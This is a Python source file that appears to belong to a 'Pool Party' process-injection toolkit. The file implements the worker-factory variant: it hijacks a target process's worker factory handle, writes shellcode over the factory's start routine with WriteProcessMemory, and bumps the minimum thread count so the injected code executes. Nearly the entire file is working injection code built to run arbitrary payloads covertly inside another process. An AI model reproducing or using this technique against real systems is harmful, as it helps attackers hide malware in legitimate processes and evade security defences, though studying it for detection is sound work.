from pool_party import *
from write_shellcode import *


class WorkerFactory(PoolParty):
    def __init__(self, process_name):
        super().__init__(process_name)
        self.process_handle = HANDLE(0)
        self.worker_factory_handle = HANDLE(0)

    def setup_execute(self):
        worker_factory_information = (ctypes.c_ubyte * SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT)()
        nt_status = NtQueryInformationWorkerFactory(self.worker_factory_handle, WorkerFactoryBasicInformation, POINTER(ctypes.c_ubyte)(worker_factory_information),
                                        SIZE_OF_WORKER_FACTORY_BASIC_INFORMATION_STRUCT, None)
        if nt_status != 0:
            logging.error("[-] NtQueryInformationWorkerFactory failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        start_routine = convert_buffer_to_struct(worker_factory_information, LPVOID, 0x48)
        if not WriteProcessMemory(self.process_handle, start_routine, shellcode, len(shellcode), None):
            logging.error("[-] Write shellcode to start routine Worker Factory Failed with error code %d" % GetLastError())
            return False

        total_worker_count = convert_buffer_to_struct(worker_factory_information, ULONG, 0x34)
        worker_factory_minium_thread_number = ULONG(total_worker_count.value + 1)
        nt_status = NtSetInformationWorkerFactory(self.worker_factory_handle, WorkerFactoryThreadMinimum, POINTER(ULONG)(worker_factory_minium_thread_number), sizeof(ULONG))
        if nt_status != 0:
            logging.error("[-] NtSetInformationWorkerFactory failed with NTSTATUS 0x{:x}".format(nt_status))
            return False

        logging.info("[+] Executing shellcode....")

    def inject(self):
        if not self.get_process_handle_by_name():
            return False

        self.worker_factory_handle = self.hijack_process_handle(TP_WORKER_FACTORY_OBJECT_NAME, WORKER_FACTORY_ALL_ACCESS)
        if self.worker_factory_handle == HANDLE(0):
            return False

        self.setup_execute()

